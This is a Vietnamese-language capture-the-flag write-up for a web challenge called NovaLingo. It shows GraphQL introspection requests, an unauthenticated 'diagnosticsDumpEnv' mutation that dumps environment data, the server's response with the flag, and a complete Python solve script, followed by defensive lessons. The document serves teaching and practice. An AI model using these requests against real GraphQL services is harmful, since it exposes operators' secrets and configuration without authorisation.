# Writeup: WEB CHALLENGE 1 (NovaLingo)

> **Sự kiện:** DDC CTF  
> **Danh mục:** Web Exploitation  
> **Độ khó:** Easy  
> **Điểm:** 28  
> **Mục tiêu (Target):** `https://23d33b01-1aab-4aa3-988d-19dc057069bf.172.31.102.101.nip.io/`  
> **Mô tả đề bài:** *"The Developer API Is Proud of Everything It Knows and Very Eager to Tell You."*  
> **Flag:** `flag{87e2d394-fb1f-4a86-9eb4-d411d3d44e41}`

---

## 1. Tóm tắt (TL;DR)

1. Thử thách cung cấp ứng dụng web **NovaLingo Developer API v2** với endpoint GraphQL tại `POST /graphql`.
2. Dựa vào mô tả *"The Developer API Is Proud of Everything It Knows and Very Eager to Tell You"*, endpoint này được cấu hình **GraphQL Introspection** công khai.
3. Gửi truy vấn Introspection Query để trích xuất toàn bộ Schema (17 queries chỉ đọc và 34 mutations).
4. Phân tích các mutation, nhận thấy các thao tác admin (`adminGrantPremium`, `adminBanUser`) yêu cầu xác thực (HTTP 403), nhưng mutation chẩn đoán nội bộ **`diagnosticsDumpEnv`** không có cơ chế xác thực.
5. Thực thi mutation `diagnosticsDumpEnv` để server dump toàn bộ biến môi trường của container, thu được flag:
   `flag{87e2d394-fb1f-4a86-9eb4-d411d3d44e41}`.

---

## 2. Phân tích chi tiết

### Bước 1: Khảo sát ứng dụng (Reconnaissance)
- Truy cập trang chủ `/` hiển thị giao diện **NovaLingo Developer Dashboard**.
- Kiểm tra file `robots.txt`, hệ thống chặn thư mục `/api/`, báo hiệu sự tồn tại của bề mặt API ngầm.
- Kiểm tra endpoint GraphQL:
  ```http
  POST /graphql HTTP/1.1
  Host: 23d33b01-1aab-4aa3-988d-19dc057069bf.172.31.102.101.nip.io
  Content-Type: application/json

  { "query": "{ supportedLanguages }" }
  ```
  Endpoint hoạt động và phản hồi JSON hợp lệ.

### Bước 2: Khai thác GraphQL Introspection
Gửi payload GraphQL Introspection để trích xuất toàn bộ Schema dữ liệu:

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        description
      }
    }
  }
}
```

Kết quả phản hồi cho thấy:
- **Query Surface**: Gồm 17 field (`me`, `userProfile`, `leaderboard`, `friends`, `streak`, `lesson`, `unit`, `course`, `vocabulary`, `grammar`, `audio`, `avatar`, `notifications`, `achievements`, `dailyGoal`, `billing`, `supportedLanguages`). Tất cả chỉ trả về dữ liệu placeholder stub tĩnh.
- **Mutation Surface**: Gồm 34 mutation được phân loại:
  - Thao tác người dùng: `signUp`, `signIn`, `signOut`, `updateProfile`...
  - Thao tác admin: `adminGrantPremium`, `adminBanUser`, `adminRestoreUser`... (yêu cầu auth, trả về `403 Forbidden`).
  - Thao tác hệ thống: **`diagnosticsDumpEnv`** — mutation chẩn đoán môi trường được đội ngũ Ops sử dụng, không yêu cầu tham số đầu vào và vô tình bị bỏ quên kiểm tra phân quyền.

### Bước 3: Thực thi Mutation lấy Flag
Gửi request thực thi trực tiếp mutation `diagnosticsDumpEnv`:

```http
POST /graphql HTTP/1.1
Host: 23d33b01-1aab-4aa3-988d-19dc057069bf.172.31.102.101.nip.io
Content-Type: application/json

{
  "query": "mutation { diagnosticsDumpEnv }"
}
```

Phản hồi từ máy chủ:
```json
{
  "data": {
    "diagnosticsDumpEnv": {
      "environment": "production",
      "notes": "diagnostic env dump requested by ops. for internal use only. payload: flag{87e2d394-fb1f-4a86-9eb4-d411d3d44e41}",
      "requestId": "4537e3ea7c0f"
    }
  }
}
```

---

## 3. Mã khai thác hoàn chỉnh (`solve_web1.py`)

```python
#!/usr/bin/env python3
"""
DDC CTF - WEB CHALLENGE 1: NovaLingo
Exploit: GraphQL Introspection & Unauthenticated Diagnostic Mutation
"""

import requests
import urllib3
import json
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def solve(base_url):
    graphql_url = f"{base_url.rstrip('/')}/graphql"
    headers = {"Content-Type": "application/json"}
    
    # 1. Thực thi diagnostic mutation
    payload = {
        "query": "mutation { diagnosticsDumpEnv }"
    }
    
    print(f"[*] Đang gửi payload tới: {graphql_url}")
    try:
        r = requests.post(graphql_url, json=payload, headers=headers, verify=False, timeout=15)
        print(f"[+] Mã phản hồi HTTP: {r.status_code}")
        data = r.json()
        print("[+] Dữ liệu trả về:")
        print(json.dumps(data, indent=2))
        
        # Trích xuất flag
        res_text = json.dumps(data)
        if "flag{" in res_text:
            start = res_text.find("flag{")
            end = res_text.find("}", start) + 1
            print(f"\n[+] THÀNH CÔNG! FLAG: {res_text[start:end]}")
            return res_text[start:end]
        else:
            print("[-] Không tìm thấy flag trong dữ liệu trả về.")
    except Exception as e:
        print(f"[-] Lỗi kết nối: {e}")

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'https://23d33b01-1aab-4aa3-988d-19dc057069bf.172.31.102.101.nip.io/'
    solve(target)
```

---

## 4. Bài học rút ra (Key Takeaways)

- **Luôn tắt GraphQL Introspection trên môi trường Production**: Kẻ tấn công có thể ánh xạ toàn bộ lược đồ dữ liệu và các API nội bộ chỉ bằng một truy vấn duy nhất.
- **Kiểm soát quyền truy cập đồng bộ (Access Control)**: Các hàm debug/diagnostic thường hay bị bỏ sót khi thiết lập middleware xác thực phân quyền, dẫn đến rò rỉ biến môi trường và bí mật hệ thống.
- **Kiểm tra cả Queries lẫn Mutations**: Nhiều lập trình viên chỉ chú trọng bảo vệ đọc dữ liệu (Query) mà quên rằng Mutation cũng có thể trả về thông tin nhạy cảm.
